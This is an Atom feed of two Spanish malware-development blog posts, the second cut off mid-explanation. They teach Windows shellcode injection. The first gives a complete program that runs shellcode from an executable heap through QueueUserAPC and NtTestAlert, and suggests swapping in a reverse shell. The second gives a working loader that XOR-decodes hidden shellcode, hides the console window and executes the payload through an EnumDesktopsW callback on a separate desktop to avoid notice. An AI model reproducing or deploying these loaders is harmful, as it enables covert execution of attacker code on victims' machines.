<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-11T17:02:08-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">c4rta</title><subtitle>Hacking e informatica</subtitle><author><name>c4rta</name></author><entry><title type="html">Shellcode almacenada en el heap e inyección vía APC injection y NtTestAlert en un proceso local</title><link href="http://localhost:4000/maldev/2023/07/17/heap-queueUserApc.html" rel="alternate" type="text/html" title="Shellcode almacenada en el heap e inyección vía APC injection y NtTestAlert en un proceso local" /><published>2023-07-17T00:00:00-06:00</published><updated>2023-07-17T00:00:00-06:00</updated><id>http://localhost:4000/maldev/2023/07/17/heap-queueUserApc</id><content type="html" xml:base="http://localhost:4000/maldev/2023/07/17/heap-queueUserApc.html"><![CDATA[<p>Esta vez vamos a almacenar la shellcode en el heap de un proceso local usando HeapCrate y HeapAlloc y la ejecutaremos con QueueUserAPC y la NTAPI indocumentada NtTestAlert</p>

<h2 id="asynchronous-procedure-calls-apc-y-queueuserapc">Asynchronous Procedure Calls (APC) y QueueUserAPC()</h2>

<p>De acuerdo a la MSDN, una APC es:</p>

<blockquote>
  <p>Es una función que se ejecuta de forma asíncrona en el contexto de un subproceso en particular</p>
</blockquote>

<p>Cada subproceso tiene un propia cola APC, y un subproceso debe estar en un estado de alerta para ejecutar un APC en modo de usuario, algunas formas de indicarle a un subproceso que este en modo de alerta es con las funciones <code class="language-plaintext highlighter-rouge">SleepEx</code> , <code class="language-plaintext highlighter-rouge">SignalObjectAndWait</code>, <code class="language-plaintext highlighter-rouge">MsgWaitForMultipleObjectsEx</code>, etc.</p>

<p>La forma en la que podemos agregar una APC a la cola APC es usando <code class="language-plaintext highlighter-rouge">QueueUserAPC</code>, la estructura de QueueUserAPC es:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="nf">QueueUserAPC</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">PAPCFUNC</span>  <span class="n">pfnAPC</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HANDLE</span>    <span class="n">hThread</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">ULONG_PTR</span> <span class="n">dwData</span>
<span class="p">);</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">pfnAPC</code> es un puntero a la APC que se llamara cuando el subproceso realiza una operacion de alerta</li>
  <li><code class="language-plaintext highlighter-rouge">hThread</code> es el identificador del hilo</li>
  <li><code class="language-plaintext highlighter-rouge">dwData</code> es un valor que funciona como un parametro a <code class="language-plaintext highlighter-rouge">pfnAPC</code></li>
</ul>

<h2 id="flujo-de-ejecucion">Flujo de ejecucion</h2>

<ul>
  <li>Crear un heap usando <code class="language-plaintext highlighter-rouge">HeapCreate</code></li>
  <li>Se asigna un bloque de memoria con <code class="language-plaintext highlighter-rouge">HeapAlloc</code> del tamaño de la shellcode en el heap creado con <code class="language-plaintext highlighter-rouge">HeapCreate</code></li>
  <li>Se escribe la shellcode en el bloque de memoria del heap usando <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code></li>
  <li>Se encola una APC en el subproceso actual usando <code class="language-plaintext highlighter-rouge">QueueUserAPC</code></li>
  <li>Se llama <code class="language-plaintext highlighter-rouge">NtTestAlert</code> para forzar la ejecucion de la APC</li>
</ul>

<h3 id="codigo">Codigo</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="cp">#pragma comment(lib, "ntdll")
</span><span class="k">using</span> <span class="n">myNtTestAlert</span> <span class="o">=</span> <span class="n">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span><span class="o">*</span><span class="p">)();</span>

<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
	<span class="s">"</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00</span><span class="s">"</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">myNtTestAlert</span> <span class="n">testAlert</span> <span class="o">=</span> <span class="p">(</span><span class="n">myNtTestAlert</span><span class="p">)(</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll"</span><span class="p">),</span> <span class="s">"NtTestAlert"</span><span class="p">));</span>
    <span class="n">HANDLE</span> <span class="n">hHeap</span> <span class="o">=</span> <span class="n">HeapCreate</span><span class="p">(</span><span class="n">HEAP_CREATE_ENABLE_EXECUTE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">LPVOID</span> <span class="n">shellcodeHeap</span> <span class="o">=</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hHeap</span><span class="p">,</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
    <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="n">shellcodeHeap</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">PTHREAD_START_ROUTINE</span> <span class="n">apcRoutine</span> <span class="o">=</span> <span class="p">(</span><span class="n">PTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcodeHeap</span><span class="p">;</span>
    <span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">apcRoutine</span><span class="p">,</span> <span class="n">GetCurrentThread</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">testAlert</span><span class="p">();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Pimero creamos un heap en donde le indicamos que en las opciones de asignacion tenga <code class="language-plaintext highlighter-rouge">HEAP_CREATE_ENABLE_EXECUTE</code> para que los bloques de memoria que se asignen permitan ejecutar codigo</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HeapCreate</span><span class="p">(</span><span class="n">HEAP_CREATE_ENABLE_EXECUTE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</code></pre></div></div>

<p>Despues asignamos un bloque de memoria donde le indicamos con <code class="language-plaintext highlighter-rouge">HEAP_ZERO_MEMORY</code> que la asignacion inicie con cero, y el tamaño de la asignacion sea el tamaño de la shellcode, por eso se usa <code class="language-plaintext highlighter-rouge">sizeof(shellcode)</code></p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hHeap</span><span class="p">,</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
</code></pre></div></div>

<p>Despues escribimos la shellcode en el bloque de memoria del heap, se usa <code class="language-plaintext highlighter-rouge">GetCurrentProcess()</code> para que el identificador del proceso sea el identificador del proceso actual, el tamaño en bytes que se van a escribir es igual al tamaño de la shellcode, por eso se vuelve a usar <code class="language-plaintext highlighter-rouge">sizeof(shellcode)</code></p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="n">shellcodeHeap</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>

<p>Despues declaramos <code class="language-plaintext highlighter-rouge">apcRoutine</code> como un puntero de tipo <code class="language-plaintext highlighter-rouge">PTHREAD_START_ROUTINE</code> el cual se le asignara la direccion de memoria que tiene <code class="language-plaintext highlighter-rouge">shellcodeHeap</code>, con esto le indicariamos que la APC apunte a <code class="language-plaintext highlighter-rouge">shellcodeHeap</code> que es el bloque del heap que contiene la shellcode</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PTHREAD_START_ROUTINE</span> <span class="n">apcRoutine</span> <span class="o">=</span> <span class="p">(</span><span class="n">PTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcodeHeap</span><span class="p">;</span>
</code></pre></div></div>

<p>Despues encolamos una APC a la cola APC, se le pasa <code class="language-plaintext highlighter-rouge">(PAPCFUNC)apcRoutine</code> para que <code class="language-plaintext highlighter-rouge">apcRoutine</code> sea interpretado como un puntero de tipo <code class="language-plaintext highlighter-rouge">PAPCFUNC</code> y sea una APC valida, tambien usamos <code class="language-plaintext highlighter-rouge">GetCurrentThread()</code> para que se use el identificador del hilo actual</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">apcRoutine</span><span class="p">,</span> <span class="n">GetCurrentThread</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>

<p>Y por ultimo mandamos a llamar a <code class="language-plaintext highlighter-rouge">testAlert()</code> para forzar la ejecucion de las APC encoladas en el hilo actual.</p>

<p>Si compilamos y ejecutamos se ejecutara la shellcode que la cual abrira la calculadora (evidetemente puedes cambiar la shellcode para que haga otra cosa, una reverse shell por ejemplo)</p>

<p><img src="assets/img/heap-queue/ejecucion.gif" alt="" /></p>

<h3 id="referencias">Referencias</h3>

<p><a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls</a></p>

<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc</a></p>

<p><a href="https://www.g0dmode.biz/remote-process-injection/queueuserapc-+-nttestalert">https://www.g0dmode.biz/remote-process-injection/queueuserapc-+-nttestalert</a></p>

<p>Eso ha sido todo, gracias por leer ❤</p>]]></content><author><name>c4rta</name></author><category term="MalDev" /><summary type="html"><![CDATA[Esta vez vamos a almacenar la shellcode en el heap de un proceso local usando HeapCrate y HeapAlloc y la ejecutaremos con QueueUserAPC y la NTAPI indocumentada NtTestAlert]]></summary></entry><entry><title type="html">Inyeccion de shellcodes via EnumDesktopsW()</title><link href="http://localhost:4000/maldev/2023/07/07/maldev-enumDesktopsW.html" rel="alternate" type="text/html" title="Inyeccion de shellcodes via EnumDesktopsW()" /><published>2023-07-07T00:00:00-06:00</published><updated>2023-07-07T00:00:00-06:00</updated><id>http://localhost:4000/maldev/2023/07/07/maldev-enumDesktopsW</id><content type="html" xml:base="http://localhost:4000/maldev/2023/07/07/maldev-enumDesktopsW.html"><![CDATA[<p class="lead">Te explicare como use la funcion <code class="language-plaintext highlighter-rouge">EnumDesktopsW()</code> para ejecutar una shellcode en un escritorio creado con <code class="language-plaintext highlighter-rouge">CreateDesktopW()</code></p>
<h2 id="enumdesktopsw">EnumDesktopsW</h2>

<p>EnumDesktopsW es una funcion de la WinAPI la cual enumera todos los escritorios del usuario, cabe recalcar que solo enumera los cuales tengan acceso <code class="language-plaintext highlighter-rouge">DESKTOP_ENUMERATE</code> o <code class="language-plaintext highlighter-rouge">GENERIC_ALL</code>, lo que hace por detras esta funcion es invocar multiples veces a la funcion callback del parámetro <code class="language-plaintext highlighter-rouge">lpEnumFunc</code> hasta que termine de enumerar todos los escritorios.</p>

<p><code class="language-plaintext highlighter-rouge">lpEnumFunc</code> es uno de los parametros que recibe <code class="language-plaintext highlighter-rouge">EnumDesktopsW()</code>, este parametro es un puntero a la callback  <code class="language-plaintext highlighter-rouge">DESKTOPENUMPROC</code>, su sintaxis es:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">CALLBACK</span> <span class="nf">EnumDesktopProc</span><span class="p">(</span>
  <span class="n">_In_</span> <span class="n">LPTSTR</span> <span class="n">lpszDesktop</span><span class="p">,</span>
  <span class="n">_In_</span> <span class="n">LPARAM</span> <span class="n">lParam</span>
<span class="p">);</span>
</code></pre></div></div>

<h3 id="como-se-ejecuta-la-shellcode">¿Como se ejecuta la shellcode?</h3>

<p>Basicamente hace esto:</p>

<ul>
  <li>Se asigna un buffer de memoria mediante una función como VirtualAlloc</li>
  <li>Se copia la shellcode en la memoria recién asignada</li>
  <li>Se usa EnumDesktopsW para enumerar los escritorios y mediante una funcion callback encontrar la dirección de una función que se puede usar para ejecutar la shellcode (La direccion que regresa VirtualAlloc)</li>
</ul>

<p>El codigo “base” para ejecutar una shellcode de esta forma tomando en cuenta la explicacion anterior, es:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">hAlloc</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">hAlloc</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
<span class="n">EnumDesktopsW</span><span class="p">(</span><span class="n">GetProcessWindowStation</span><span class="p">(),(</span><span class="n">DESKTOPENUMPROCW</span><span class="p">)</span> <span class="n">hAlloc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>

<p>Pero nos vamos a poner experimentadores y te voy a explicar como usando ese mismo codigo de base lo converti en algo bien genial</p>

<h3 id="explicacion">Explicacion</h3>

<p>Como en los demas tutoriales, te pondre todo el codigo y te explicare que hacen las funciones y como se ejecuta la shellcode</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
	<span class="s">"</span><span class="se">\x92\x26\xed\x8a\x9e\x86\xa2\x6e\x6e\x6e\x2f\x3f\x2f\x3e</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x3c\x3f\x26\x5f\xbc\x0b\x26\xe5\x3c\x0e\x26\xe5\x3c\x76</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x38\x26\xe5\x3c\x4e\x23\x5f\xa7\x26\xe5\x1c\x3e\x26\x61</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xd9\x24\x24\x26\x5f\xae\xc2\x52\x0f\x12\x6c\x42\x4e\x2f</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xaf\xa7\x63\x2f\x6f\xaf\x8c\x83\x3c\x26\xe5\x3c\x4e\xe5</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x2c\x52\x2f\x3f\x26\x6f\xbe\x08\xef\x16\x76\x65\x6c\x61</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xeb\x1c\x6e\x6e\x6e\xe5\xee\xe6\x6e\x6e\x6e\x26\xeb\xae</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x1a\x09\x26\x6f\xbe\xe5\x26\x76\x3e\x2a\xe5\x2e\x4e\x27</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x6f\xbe\x8d\x38\x23\x5f\xa7\x26\x91\xa7\x2f\xe5\x5a\xe6</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x26\x6f\xb8\x26\x5f\xae\xc2\x2f\xaf\xa7\x63\x2f\x6f\xaf</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x56\x8e\x1b\x9f\x22\x6d\x22\x4a\x66\x2b\x57\xbf\x1b\xb6</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x36\x2a\xe5\x2e\x4a\x27\x6f\xbe\x08\x2f\xe5\x62\x26\x2a</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xe5\x2e\x72\x27\x6f\xbe\x2f\xe5\x6a\xe6\x26\x6f\xbe\x2f</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x36\x2f\x36\x30\x37\x34\x2f\x36\x2f\x37\x2f\x34\x26\xed</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x82\x4e\x2f\x3c\x91\x8e\x36\x2f\x37\x34\x26\xe5\x7c\x87</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x25\x91\x91\x91\x33\x27\xd0\x19\x1d\x5c\x31\x5d\x5c\x6e</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x6e\x2f\x38\x27\xe7\x88\x26\xef\x82\xce\x6f\x6e\x6e\x27</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xe7\x8b\x27\xd2\x6c\x6e\x7f\x32\xae\xc6\x6f\x27\x2f\x3a</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x27\xe7\x8a\x22\xe7\x9f\x2f\xd4\x22\x19\x48\x69\x91\xbb</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x22\xe7\x84\x06\x6f\x6f\x6e\x6e\x37\x2f\xd4\x47\xee\x05</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x6e\x91\xbb\x04\x64\x2f\x30\x3e\x3e\x23\x5f\xa7\x23\x5f</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xae\x26\x91\xae\x26\xe7\xac\x26\x91\xae\x26\xe7\xaf\x2f</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xd4\x84\x61\xb1\x8e\x91\xbb\x26\xe7\xa9\x04\x7e\x2f\x36</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x22\xe7\x8c\x26\xe7\x97\x2f\xd4\xf7\xcb\x1a\x0f\x91\xbb</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xeb\xae\x1a\x64\x27\x91\xa0\x1b\x8b\x86\xfd\x6e\x6e\x6e</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x26\xed\x82\x7e\x26\xe7\x8c\x23\x5f\xa7\x04\x6a\x2f\x36</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x26\xe7\x97\x2f\xd4\x6c\xb7\xa6\x31\x91\xbb\xed\x96\x6e</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x10\x3b\x26\xed\xaa\x4e\x30\xe7\x98\x04\x2e\x2f\x37\x06</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x6e\x7e\x6e\x6e\x2f\x36\x26\xe7\x9c\x26\x5f\xa7\x2f\xd4</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x36\xca\x3d\x8b\x91\xbb\x26\xe7\xad\x27\xe7\xa9\x23\x5f</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xa7\x27\xe7\x9e\x26\xe7\xb4\x26\xe7\x97\x2f\xd4\x6c\xb7</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xa6\x31\x91\xbb\xed\x96\x6e\x13\x46\x36\x2f\x39\x37\x06</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x6e\x2e\x6e\x6e\x2f\x36\x04\x6e\x34\x2f\xd4\x65\x41\x61</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x5e\x91\xbb\x39\x37\x2f\xd4\x1b\x00\x23\x0f\x91\xbb\x27</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x91\xa0\x87\x52\x91\x91\x91\x26\x6f\xad\x26\x47\xa8\x26</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xeb\x98\x1b\xda\x2f\x91\x89\x36\x04\x6e\x37\x27\xa9\xac</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x9e\xdb\xcc\x38\x91\xbb</span><span class="s">"</span>
<span class="p">};</span>

<span class="k">typedef</span> <span class="nf">BOOL</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">ShellcodeFunction</span><span class="p">)(</span><span class="n">LPCWSTR</span><span class="p">,</span> <span class="n">LPARAM</span><span class="p">);</span>

<span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="nf">SwitchDesktopThread</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">){</span>
    <span class="n">HDESK</span> <span class="n">hDesktop</span> <span class="o">=</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="n">HDESK</span><span class="o">&gt;</span><span class="p">(</span><span class="n">lpParameter</span><span class="p">);</span>
    <span class="n">SetThreadDesktop</span><span class="p">(</span><span class="n">hDesktop</span><span class="p">);</span>
    
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
	<span class="n">HWND</span> <span class="n">hWin</span> <span class="o">=</span> <span class="n">GetConsoleWindow</span><span class="p">();</span>
	<span class="n">ShowWindow</span><span class="p">(</span><span class="n">hWin</span><span class="p">,</span> <span class="n">SW_HIDE</span><span class="p">);</span>
	
    <span class="n">HDESK</span> <span class="n">hDesktop</span> <span class="o">=</span> <span class="n">CreateDesktopW</span><span class="p">(</span><span class="s">L"ShellcodeDesk"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hDesktop</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">){</span>
        <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SwitchDesktopThread</span><span class="p">,</span> <span class="n">hDesktop</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
            <span class="n">CloseDesktop</span><span class="p">(</span><span class="n">hDesktop</span><span class="p">);</span>
            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
	
	        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
	            <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">)(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="sc">'\x6e'</span><span class="p">);</span>
	        <span class="p">}</span>
	
	        <span class="k">const</span> <span class="kt">size_t</span> <span class="n">shellcodeSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
	
	        <span class="n">LPVOID</span> <span class="n">hAlloc</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span>
	            <span class="nb">NULL</span><span class="p">,</span>
	            <span class="n">shellcodeSize</span><span class="p">,</span>
	            <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span>
	            <span class="n">PAGE_EXECUTE_READWRITE</span>
	        <span class="p">);</span>
	
	        <span class="n">memcpy</span><span class="p">(</span><span class="n">hAlloc</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcodeSize</span><span class="p">);</span>
	        <span class="n">EnumDesktopsW</span><span class="p">(</span><span class="n">GetProcessWindowStation</span><span class="p">(),</span> <span class="p">(</span><span class="n">DESKTOPENUMPROCW</span><span class="p">)</span><span class="n">hAlloc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	        <span class="n">CloseDesktop</span><span class="p">(</span><span class="n">hDesktop</span><span class="p">);</span>
		<span class="p">}</span>

    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="explicacion-rapida">Explicacion rapida</h3>

<p>Se crea un hilo para ejecutar <code class="language-plaintext highlighter-rouge">SwitchDesktopThread()</code>, asi que cuando se ejecute esa funcion cambiara al escritorio mediante <code class="language-plaintext highlighter-rouge">SetThreadDesktop()</code>, ese escritorio se llama “ShellcodeDesk” creado con <code class="language-plaintext highlighter-rouge">CreateDesktop()</code>, permitiendo que esa accion ocurra en segundo plano en ese hilo que se creo, despues se reserva memoria con <code class="language-plaintext highlighter-rouge">VirtualAlloc()</code> para la shellcode y se inyectara en el contexto del escritorio “ShellcodeDesk” mediante la funcion de callback <code class="language-plaintext highlighter-rouge">EnumDesktopW()</code>, permitiento asi que el escritorio actual del usuario no este ocurriendo nada, y todo el proceso de la shellcode se este ejecutando en el escritorio “ShellcodeDesk”</p>

<h3 id="explicacion-de-cada-funcion">Explicacion de cada funcion</h3>

<h4 id="createdesktopw">CreateDesktopW()</h4>

